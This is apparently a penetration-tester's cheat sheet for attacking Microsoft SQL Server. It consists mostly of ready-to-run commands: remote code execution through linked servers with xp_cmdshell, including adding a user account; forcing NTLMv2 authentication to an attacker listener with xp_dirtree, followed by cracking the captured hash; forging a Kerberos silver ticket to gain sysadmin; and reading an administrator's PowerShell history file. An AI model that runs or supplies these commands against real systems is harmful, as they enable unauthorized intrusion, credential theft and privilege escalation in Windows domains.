# MSSQL Linked Server xp_cmdshell RCE

With any SQL login, check for linked servers — a common lateral-movement path even when `xp_cmdshell` is disabled locally.

```bash
mssqlclient.py '<domain>/<user>:<pass>'@<target> -windows-auth
```
```sql
EXEC sp_linkedservers;
EXEC ('xp_cmdshell ''whoami''') AT <LINKED_SERVER_NAME>;
EXEC ('xp_cmdshell ''net user <u> <p> /add''') AT <LINKED_SERVER_NAME>;
```

If `xp_cmdshell` is unavailable and the DB itself is unreachable, `xp_dirtree` still works for anyone who can run queries — it forces a UNC fetch, coercing an NTLMv2 auth to a listener you control, even cross-domain:
```sql
EXEC xp_dirtree '\\<LHOST>\share';
```
```bash
sudo responder -I <iface>   # or smbserver.py -smb2support <name> <dir>
hashcat -a0 -m5600 hash.txt <WORDLIST>
```

Silver ticket for MSSQL sysadmin — if you hold a service account's NT hash and know the SPN (`MSSQLSvc/<host>:<port>`), forge a silver ticket carrying a privileged group RID to get sysadmin:
```bash
# Get domain SID and MSSQL service account hash (via secretsdump or Kerberoast+crack)
# Forge silver ticket with IT group RID (or any group that maps to sysadmin in MSSQL):
ticketer.py -nthash <service-acct-NT-hash> -domain <domain> -domain-sid <SID> \
  -spn 'MSSQLSvc/<mssql-host>:<port>' -user-id 500 -groups 512,513,518,519,520,1103 Administrator
export KRB5CCNAME=Administrator.ccache
mssqlclient.py -k -no-pass <domain>/<mssql-host>

# Verify sysadmin:
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC xp_cmdshell 'whoami';
```

MSSQL OPENROWSET BULK + silver ticket for file read as another context:
```sql
-- Read a file as the MSSQL service account (or via linked server context):
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS data;
```
